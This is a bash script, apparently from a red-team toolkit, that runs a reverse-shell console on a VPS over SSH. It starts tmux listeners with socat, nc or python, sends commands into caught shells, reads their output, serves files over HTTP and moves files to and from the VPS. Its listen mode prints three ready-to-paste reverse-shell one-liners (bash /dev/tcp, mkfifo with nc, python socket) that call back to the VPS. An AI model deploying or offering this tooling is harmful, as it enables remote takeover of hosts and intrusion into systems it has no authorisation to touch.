#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
# vps.sh —— 反弹 Shell 落地与中转控制台（本机 → VPS）
#
# 配置（二选一，env 优先）：
#   $DSH_HOME/.env 里写：
#     REDTEAM_VPS_HOST=ubuntu@203.0.113.10
#     REDTEAM_VPS_KEY=/Users/you/.dsh/redteam/toolkit/vps/id_rsa
#   或调用时临时给：VPS_HOST=ubuntu@1.2.3.4 VPS_KEY=/path/key ./vps.sh status
#
# 子命令：
#   status | port | listen [port] | sessions | send <port> <cmd>
#   read <port> [lines] | watch <port> | attach <port> | kill <port>
#   serve [port] [dir] | push <local> [remote] | get <remote> [local] | sh '<cmd>'
#
# 约定：占用的会话名形如 l<port>（监听）/ s<port>（HTTP 服务），只动自己的，
# 不碰已有的 cap / sh / up / www 等会话。
# ─────────────────────────────────────────────────────────────────────────────
set -uo pipefail

DSH_HOME="${DSH_HOME:-$HOME/.dsh}"
ENV_FILE="$DSH_HOME/.env"
TK="$DSH_HOME/redteam/toolkit"

# 读 .env（只取需要的两个键，不 source 整个文件）
env_get() {
  local k="$1" v=""
  [ -f "$ENV_FILE" ] && v="$(grep -E "^${k}=" "$ENV_FILE" 2>/dev/null | tail -1 | cut -d= -f2- | sed -e 's/^"//' -e 's/"$//' -e "s/^'//" -e "s/'$//")"
  printf '%s' "$v"
}

HOST="${VPS_HOST:-$(env_get REDTEAM_VPS_HOST)}"
KEY="${VPS_KEY:-$(env_get REDTEAM_VPS_KEY)}"
KEY="${KEY:-$TK/vps/id_rsa}"

if [ -z "$HOST" ]; then
  cat >&2 <<'EOF'
[!] 还没配 VPS 地址。任选一种：

  1) 写进 $DSH_HOME/.env：
       REDTEAM_VPS_HOST=ubuntu@203.0.113.10
       REDTEAM_VPS_KEY=/Users/you/.dsh/redteam/toolkit/vps/id_rsa

  2) 临时给：VPS_HOST=ubuntu@1.2.3.4 VPS_KEY=/path/key vps.sh status

  3) 重跑引导：bash $DSH_HOME/redteam/setup.sh
EOF
  exit 2
fi

if [ ! -f "$KEY" ]; then
  echo "[!] 私钥不存在：$KEY" >&2
  echo "    放到该路径并 chmod 600，或设 REDTEAM_VPS_KEY 指向实际私钥。" >&2
  exit 2
fi
chmod 600 "$KEY" 2>/dev/null || true

SSH=(ssh -i "$KEY" -o BatchMode=yes -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10 "$HOST")

rsh() { "${SSH[@]}" "$@" 2>/dev/null; }
rscript() { "${SSH[@]}" bash -s 2>/dev/null; }   # 从 stdin 读脚本

b64() { printf '%s' "$1" | base64 | tr -d '\n'; }
d64() { printf '%s' "$1" | base64 -d; }

need_ok() {
  "${SSH[@]}" 'echo ok' >/dev/null 2>&1 || { echo "[!] SSH 连不上 $HOST（检查地址/私钥/安全组）" >&2; exit 3; }
}

cmd="${1:-status}"; shift || true

case "$cmd" in
  status)
    need_ok
    echo "VPS: $HOST    私钥: $KEY"
    rsh 'uname -srm; echo; echo "--- 工具 ---"; for t in tmux socat nc rlwrap python3 curl wget nc.traditional; do printf "%-16s %s\n" "$t" "$(command -v $t || echo -)"; done'
    echo; echo "--- 9000-9999 占用 ---"
    rsh 'ss -lntp 2>/dev/null | awk "{print \$4}" | grep -oE ":(9[0-9]{3})$" | tr -d ":" | sort -n | tr "\n" " "; echo'
    echo "--- tmux 会话 ---"
    rsh 'tmux ls 2>/dev/null || echo "(无)"'
    ;;

  port)
    need_ok
    busy="$(rsh 'ss -lnt 2>/dev/null | awk "{print \$4}" | grep -oE ":(9[0-9]{3})$" | tr -d ":" | sort -n | tr "\n" " "')"
    for p in $(seq 9000 9999); do
      case " $busy " in *" $p "*) continue ;; esac
      rsh "tmux has-session -t l$p 2>/dev/null" && continue
      echo "$p"; exit 0
    done
    echo "[!] 9000-9999 没有空闲端口" >&2; exit 4
    ;;

  listen)
    need_ok
    p="${1:-}"
    [ -z "$p" ] && p="$(bash "$0" port)"
    sess="l$p"
    rsh "tmux has-session -t $sess 2>/dev/null" && { echo "[!] 会话 $sess 已存在，先 kill $p" >&2; exit 5; }
    # 优先 socat（pty，最稳），没有就 nc，再没有 python
    rscript <<EOF
if command -v socat >/dev/null 2>&1; then
  tmux new-session -d -s $sess "while true; do socat TCP-LISTEN:$p,reuseaddr,fork EXEC:'/bin/bash -i',pty,stderr,setsid,sigint,sane; sleep 1; done"
elif command -v nc >/dev/null 2>&1; then
  tmux new-session -d -s $sess "while true; do nc -lvnp $p; sleep 1; done"
else
  tmux new-session -d -s $sess "while true; do python3 -c 'import socket,subprocess,os;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",$p));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'; sleep 1; done"
fi
sleep 1; tmux ls | grep -q "^$sess:" && echo "listening on $p"
EOF
    ip="${HOST#*@}"
    cat <<EOF

已开监听：$sess（端口 $p，自动重听）

目标侧反弹命令（挑一条）：
  bash -c 'bash -i >& /dev/tcp/$ip/$p 0>&1'
  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $ip $p > /tmp/f
  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$ip",$p));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/bash","-i"])'

上线后：
  $0 send $p 'id; uname -a'
  $0 read $p 60
EOF
    ;;

  sessions)
    need_ok; rsh 'tmux ls 2>/dev/null || echo "(无)"'
    ;;

  send)
    p="${1:?用法: send <port> <cmd>}"; shift
    line="$*"
    need_ok
    rsh "tmux has-session -t l$p 2>/dev/null" || { echo "[!] 会话 l$p 不存在" >&2; exit 5; }
    rsh "tmux send-keys -t l$p \"\$(printf '%s' '$(b64 "$line")' | base64 -d)\" Enter"
    echo "→ sent to l$p"
    ;;

  read)
    p="${1:?用法: read <port> [lines]}"; n="${2:-200}"
    need_ok
    rsh "tmux capture-pane -p -t l$p -S -$n"
    ;;

  watch)
    p="${1:?用法: watch <port>}"
    need_ok
    "${SSH[@]}" -t "while true; do tmux capture-pane -p -t l$p -S -80 | tail -80; echo '--- (Ctrl-C 退出)'; sleep 2; done"
    ;;

  attach)
    p="${1:?用法: attach <port>}"
    need_ok
    "${SSH[@]}" -t "tmux attach -t l$p"
    ;;

  kill)
    p="${1:?用法: kill <port>}"
    need_ok
    rsh "tmux kill-session -t l$p 2>/dev/null; tmux kill-session -t s$p 2>/dev/null; sleep 1; ss -lnt 2>/dev/null | grep -q ':$p ' && echo 'still listening' || echo 'released'"
    ;;

  serve)
    p="${1:-9008}"; dir="${2:-/tmp}"
    need_ok
    rsh "tmux has-session -t s$p 2>/dev/null" && { echo "[!] s$p 已存在" >&2; exit 5; }
    rsh "tmux new-session -d -s s$p 'cd $dir && python3 -m http.server $p'"
    ip="${HOST#*@}"
    echo "HTTP 服务：http://$ip:$p/（目录 $dir）"
    ;;

  push)
    src="${1:?用法: push <本地> [远端]}"; dst="${2:-/tmp/}"
    need_ok
    scp -i "$KEY" -o StrictHostKeyChecking=accept-new -q "$src" "$HOST:$dst" && echo "→ $HOST:$dst"
    ;;

  get)
    src="${1:?用法: get <远端> [本地]}"; dst="${2:-.}"
    need_ok
    scp -i "$KEY" -o StrictHostKeyChecking=accept-new -q "$HOST:$src" "$dst" && echo "← $dst"
    ;;

  sh)
    [ $# -gt 0 ] || { echo "用法: sh '<命令>'" >&2; exit 1; }
    need_ok
    "${SSH[@]}" "$@"
    ;;

  *)
    sed -n '2,25p' "$0"
    exit 1
    ;;
esac
